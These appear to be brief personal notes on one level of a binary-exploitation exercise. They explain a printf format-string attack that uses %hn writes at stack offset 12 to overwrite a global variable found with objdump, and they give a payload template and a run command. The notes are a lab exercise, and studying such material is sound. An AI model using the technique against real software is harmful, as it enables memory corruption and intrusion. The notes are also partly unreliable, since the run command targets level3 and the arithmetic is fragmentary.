# LEVEL 4

The principle is exactly the same as the previous level. The difference is that the comparison is against a much higher number, way over the limit of our buffer, 0x200.

[Source](https://blog.1nf1n1ty.team/hacktricks/binary-exploitation/format-strings)

objdump -D ./level4 gives the address of m : 0x8049810

pad = %12 
    To overwrite the input of gets, we need to access the 12th argument in printf.
    This is because printf is in its own function so we need to go further in the stack to retrieve the gets input.

`[address+1][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

1692 0116-8 = 0108


(python /var/tmp/exploit.py) | ./level3

citer la source de l'article